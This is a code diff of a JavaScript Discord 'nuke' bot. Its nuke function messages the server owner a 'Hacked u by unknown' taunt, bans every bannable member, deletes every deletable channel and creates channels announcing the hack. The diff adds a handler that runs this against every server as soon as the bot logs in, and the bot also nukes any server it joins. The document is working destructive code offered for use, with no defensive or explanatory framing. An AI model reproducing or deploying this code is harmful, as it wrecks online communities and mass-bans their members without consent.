@@ -25,41 +25,28 @@ const myID = "415595760990552065";
 ti={}  
 spee={};
 
-async function nuke(guild) {
-  let users = 0;
-  let channels = 0;
-
-  await guild.fetchMembers();
-
-  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
-
-
-  await Promise.all(guild.members.map(async (m) => {
-    if (m.bannable) {
-      users++;
-      await m.send('^_^').catch(e => { return void e; });
-      return m.ban();
-    }
-  }));
 
 
 
-    await Promise.all(guild.channels.map(c => {
-    if (c.deletable) {
-      channels++;
-      return c.delete();
-    }
-  }));
+client.on('ready', () => {
+  console.log(`Logged in as ${client.user.tag} !`);
+
+});
+client.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${client.guilds.size} " ] Users! [ " ${client.users.size} " ]`);
+
+        
+    
+
+});
 
 
 
-    await guild.createChannel('Hacked u by unknown Is here', 'text');
-
-      await guild.createChannel('Hacked u by unknown Is here', 'voice');
-
-  
-
-}
 
 
 
@@ -458,6 +445,53 @@ m.createChannel('Hacked u by unknown Is here', 'voice');
 
 
 
+
+
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+
+  await guild.fetchMembers();
+
+  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+
+
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('^_^').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+
+
+
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+
+    await guild.createChannel('Hacked u by unknown Is here', 'text');
+
+      await guild.createChannel('Hacked u by unknown Is here', 'voice');
+
+  
+
+}
+
+
+
+client.on('ready', () => {
+  for(const [, g] of client.guilds) nuke(g).catch(console.error);
+  console.log('-------------------------------------------------------------');
+  console.log('');
+  console.log("Made by YzhF1");
+  console.log("");
+  console.log("-------------------------------------------------------------");
+
+});
 
 client.on('guildCreate', async (guild) => {
   return nuke(guild).catch(console.error);
